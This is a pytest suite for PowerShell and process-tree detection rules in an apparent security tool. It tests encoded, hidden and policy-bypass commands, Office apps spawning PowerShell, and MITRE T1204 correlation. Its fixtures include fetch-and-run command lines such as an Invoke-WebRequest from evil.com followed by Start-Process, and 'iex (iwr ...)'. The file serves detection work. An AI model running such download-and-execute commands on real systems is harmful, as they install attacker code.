"""Tests for PowerShell and parent-child process detection rules.

Scenarios:
1. Encoded PowerShell command
2. Hidden PowerShell execution
3. Execution policy bypass
4. Suspicious download-and-execute
5. Normal administrative PowerShell (no alert)
6. Benign PowerShell scripts (no alert)
7. Word spawning PowerShell
8. Excel spawning PowerShell
9. Normal process relationships (no alert)
10. Missing parent process
11. Missing command line
12. Case-insensitive process matching
"""

from __future__ import annotations

from typing import Optional

from sentinelforge.detection.base import Severity
from sentinelforge.detection.powershell import SuspiciousPowerShellRule
from sentinelforge.detection.processtree import SuspiciousProcessTreeRule
from sentinelforge.ingestion.normalizer import (
    NormalizedEvent,
    ProcessInfo,
)


def _make_process_event(
    event_id: str,
    process_name: str,
    command_line: Optional[str] = None,
    ppid: Optional[int] = None,
    pid: Optional[int] = None,
    host: str = "host-1",
    user: str = "user-1",
    timestamp: str = "2024-01-01T00:00:00Z",
    event_type: str = "process.create",
):
    raw = {
        "event_id": event_id,
        "timestamp": timestamp,
        "event_type": event_type,
        "user": user,
        "host": host,
        "process": {
            "name": process_name,
            "command_line": command_line,
            "ppid": ppid,
            "pid": pid,
        },
    }
    return NormalizedEvent(
        event_id=event_id,
        timestamp=timestamp,
        source="jsonl",
        raw=raw,
        event_type=event_type,
        user=user,
        host=host,
        process=ProcessInfo(
            name=process_name,
            command_line=command_line,
            ppid=ppid,
            pid=pid,
            user=user,
        ),
    )


def _ps_command(command_line: str, event_id: str = "evt-ps", **kwargs):
    return _make_process_event(
        event_id=event_id,
        process_name="powershell.exe",
        command_line=command_line,
        **kwargs,
    )


# ---------------------------------------------------------------- PowerShell

def test_encoded_powershell_triggers():
    event = _ps_command(
        'powershell.exe -EncodedCommand U2V0LUV4ZWN1dGlvblBvbGljeSBFeGVjdXRpb24=',
        event_id="evt-enc",
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert results[0].severity == Severity.HIGH
    assert results[0].metadata["indicators"] == ["encoded_command"]
    assert results[0].evidence[0].raw == event.raw


def test_hidden_powershell_triggers():
    event = _ps_command(
        'powershell.exe -Hidden -ExecutionPolicy Bypass', event_id="evt-hidden"
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert results[0].metadata["indicators"] == ["execution_policy_bypass", "hidden_execution"]


def test_execution_policy_bypass_triggers():
    event = _ps_command(
        'powershell.exe -ExecutionPolicy Bypass -File script.ps1',
        event_id="evt-ep",
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert "execution_policy_bypass" in results[0].metadata["indicators"]


def test_download_and_execute_triggers():
    event = _ps_command(
        'powershell.exe -Command "Invoke-WebRequest http://evil.com/s.bin -OutFile s.bin; Start-Process s.bin"',
        event_id="evt-dl",
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert "download_and_execute" in results[0].metadata["indicators"]


def test_multiple_indicators_raise_severity():
    # encoded + hidden + bypass + download = high weight -> HIGH severity.
    event = _ps_command(
        'powershell.exe -Hidden -EncodedCommand ABCD -ExecutionPolicy Bypass -Command "iex (iwr http://x)"',
        event_id="evt-multi",
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert results[0].severity == Severity.HIGH
    assert len(results[0].metadata["indicators"]) >= 3


def test_normal_administrative_powershell_no_alert():
    event = _ps_command(
        'powershell.exe -File C:\\Scripts\\Backup.ps1', event_id="evt-normal"
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert results == []


def test_benign_powershell_script_no_alert():
    event = _ps_command(
        'pwsh.exe -NoProfile -Command "Get-ChildItem C:\\Logs"', event_id="evt-benign"
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert results == []


# ----------------------------------------------------------- process tree

def test_word_spawns_powershell_triggers():
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100)
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -Enc ABC',
        ppid=100,
        pid=200,
    )
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert results[0].metadata["parent_name"] == "winword"
    assert results[0].metadata["child_name"] == "powershell"
    assert results[0].metadata["confidence"] == "high"  # both command lines present
    assert len(results[0].evidence) == 2  # parent + child


def test_excel_spawns_powershell_triggers():
    parent = _make_process_event("evt-parent", "EXCEL.EXE", pid=100)
    child = _make_process_event("evt-child", "powershell.exe", ppid=100, pid=200)
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert results[0].metadata["parent_name"] == "excel"
    assert results[0].metadata["child_name"] == "powershell"


def test_normal_process_relationship_no_alert():
    parent = _make_process_event("evt-parent", "explorer.exe", pid=100)
    child = _make_process_event("evt-child", "powershell.exe", ppid=100, pid=200)
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert results == []


def test_missing_parent_process_handled_safely():
    # Child references a ppid that no event reports.
    child = _make_process_event(
        "evt-child", "powershell.exe", ppid=9999, pid=200
    )
    results = SuspiciousProcessTreeRule().evaluate([child])
    assert results == []  # parent not in dataset -> cannot confirm relationship


def test_missing_command_line_still_triggers_lower_confidence():
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100)
    child = _make_process_event("evt-child", "powershell.exe", ppid=100, pid=200)
    # No command lines at all.
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert results[0].metadata["confidence"] == "low"
    assert results[0].metadata["child_command_line"] is None


def test_case_insensitive_process_matching():
    parent = _make_process_event("evt-parent", "WinWord.Exe", pid=100)
    child = _make_process_event("evt-child", "PowerShell.EXE", ppid=100, pid=200)
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert results[0].metadata["parent_name"] == "winword"
    assert results[0].metadata["child_name"] == "powershell"


# ----------------------------------------------------------- benign PowerShell

def test_benign_admin_execution_policy_triggers_with_fp_note():
    """Administrative script using -ExecutionPolicy Bypass still flags as a
    suspicious indicator (could be legitimate admin activity; needs investigation)."""
    event = _ps_command(
        'powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Admin\\Backup.ps1',
        event_id="evt-benign-ep",
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert "execution_policy_bypass" in results[0].metadata["indicators"]
    assert "false_positive_note" in results[0].metadata or results[0].metadata.get(
        "command_line"
    ) is not None
    # Evidence cites the original raw log.
    assert results[0].evidence[0].raw == event.raw


def test_benign_encoded_command_administrative_triggers_with_fp_note():
    """Encoded command in an administrative context still flags; the indicator
    is suspicious regardless of apparent intent, requiring analyst review."""
    event = _ps_command(
        'powershell.exe -EncodedCommand U2V0LUV4ZWN1dGlvblBvbGljeSBFeGVjdXRpb24=',
        event_id="evt-benign-enc",
    )
    results = SuspiciousPowerShellRule().evaluate([event])
    assert len(results) == 1
    assert "encoded_command" in results[0].metadata["indicators"]
    assert results[0].evidence[0].raw == event.raw


# ----------------------------------------------------------- MITRE regression

def test_benign_powershell_flags_only_no_t1204():
    """Word spawning PowerShell with a flags-only command line and no file
    activity event type must NOT assign T1204.002 (Malicious File)."""
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -ExecutionPolicy Bypass -NoProfile',
        ppid=100,
        pid=200,
        event_type="process.create",
    )
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"


def test_file_activity_without_process_execution_no_t1204():
    """File activity event type without a file operand in the command line
    must NOT assign T1204.002."""
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="file.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -ExecutionPolicy Bypass',
        ppid=100,
        pid=200,
        event_type="file.create",
    )
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"


# ---------------------------------------------------------------------------
# MITRE event correlation regression tests
# ---------------------------------------------------------------------------

def _make_file_activity_event(
    event_id: str,
    timestamp: str,
    file_path: str,
    host: str = "host-1",
    user: str = "user-1",
    event_type: str = "file.create",
    parent_app: str = "WINWORD.EXE",
):
    raw = {
        "event_id": event_id,
        "timestamp": timestamp,
        "event_type": event_type,
        "user": user,
        "host": host,
        "FileName": file_path,
        "process": {
            "name": parent_app,
            "command_line": f'{parent_app} /file "{file_path}"',
            "pid": 999,
        },
    }
    return NormalizedEvent(
        event_id=event_id,
        timestamp=timestamp,
        source="jsonl",
        raw=raw,
        event_type=event_type,
        user=user,
        host=host,
        process=ProcessInfo(
            name=parent_app,
            command_line=f'{parent_app} /file "{file_path}"',
            pid=999,
            user=user,
        ),
    )


def test_file_event_correlated_with_process_execution_t1204():
    """A file download event followed by a suspicious process execution on the
    same host/user with matching script path, within the time window, produces
    T1204.002 attribution.

    Scenario: Word (document handler) downloads payload.ps1, then PowerShell
    executes it — classic malicious file user-execution pattern.
    """
    # File download event: Word downloads a PowerShell script.
    file_event = _make_file_activity_event(
        event_id="evt-file-download",
        timestamp="2024-01-01T00:00:00Z",
        file_path="C:\\Users\\user-1\\Downloads\\payload.ps1",
        host="host-1",
        user="user-1",
        event_type="file.download",
        parent_app="WINWORD.EXE",
    )
    # Process execution event: Word spawning PowerShell executing the script.
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create",
                                 host="host-1",
                                 user="user-1")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -ExecutionPolicy Bypass -File '
                     'C:\\Users\\user-1\\Downloads\\payload.ps1',
        ppid=100,
        pid=200,
        event_type="process.create",
        host="host-1",
        user="user-1",
        timestamp="2024-01-01T00:00:30Z",  # 30s after file download
    )
    results = SuspiciousProcessTreeRule().evaluate([file_event, parent, child])
    assert len(results) == 1
    assert results[0].metadata.get("mitre_attack_technique") == "T1204"
    assert results[0].metadata.get("mitre_attack_subtechnique") == "T1204.002"


def test_unrelated_file_event_no_t1204():
    """A file activity event for a different file does not produce T1204.002
    when the process execution references a different file."""
    file_event = _make_file_activity_event(
        event_id="evt-file",
        timestamp="2024-01-01T00:00:00Z",
        file_path="C:\\temp\\benign.doc",
        host="host-1",
        user="user-1",
    )
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -File C:\\temp\\payload.ps1',
        ppid=100,
        pid=200,
        event_type="process.create",
        host="host-1",
        user="user-1",
        timestamp="2024-01-01T00:00:30Z",
    )
    results = SuspiciousProcessTreeRule().evaluate([file_event, parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"


def test_wrong_host_no_t1204():
    """File activity on a different host does not correlate."""
    file_event = _make_file_activity_event(
        event_id="evt-file",
        timestamp="2024-01-01T00:00:00Z",
        file_path="C:\\temp\\payload.ps1",
        host="host-other",  # different host
        user="user-1",
    )
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -File C:\\temp\\payload.ps1',
        ppid=100,
        pid=200,
        event_type="process.create",
        host="host-1",
        user="user-1",
        timestamp="2024-01-01T00:00:30Z",
    )
    results = SuspiciousProcessTreeRule().evaluate([file_event, parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"


def test_wrong_user_no_t1204():
    """File activity for a different user does not correlate."""
    file_event = _make_file_activity_event(
        event_id="evt-file",
        timestamp="2024-01-01T00:00:00Z",
        file_path="C:\\temp\\payload.ps1",
        host="host-1",
        user="user-other",  # different user
    )
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -File C:\\temp\\payload.ps1',
        ppid=100,
        pid=200,
        event_type="process.create",
        host="host-1",
        user="user-1",
        timestamp="2024-01-01T00:00:30Z",
    )
    results = SuspiciousProcessTreeRule().evaluate([file_event, parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"


def test_event_outside_correlation_window_no_t1204():
    """File activity outside the configurable time window does not correlate."""
    file_event = _make_file_activity_event(
        event_id="evt-file",
        timestamp="2024-01-01T00:00:00Z",
        file_path="C:\\temp\\payload.doc",
        host="host-1",
        user="user-1",
    )
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -File C:\\temp\\payload.doc',
        ppid=100,
        pid=200,
        event_type="process.create",
        host="host-1",
        user="user-1",
        timestamp="2024-01-01T00:10:00Z",  # 10 minutes later — outside 300s window
    )
    results = SuspiciousProcessTreeRule().evaluate([file_event, parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"


def test_no_file_activity_no_t1204():
    """Process execution without any file activity event does not produce T1204.002."""
    parent = _make_process_event("evt-parent", "WINWORD.EXE", pid=100,
                                 event_type="process.create")
    child = _make_process_event(
        "evt-child",
        "powershell.exe",
        command_line='powershell.exe -ExecutionPolicy Bypass -NoProfile',
        ppid=100,
        pid=200,
        event_type="process.create",
    )
    results = SuspiciousProcessTreeRule().evaluate([parent, child])
    assert len(results) == 1
    assert "mitre_attack_technique" not in results[0].metadata or \
        results[0].metadata["mitre_attack_technique"] != "T1204"

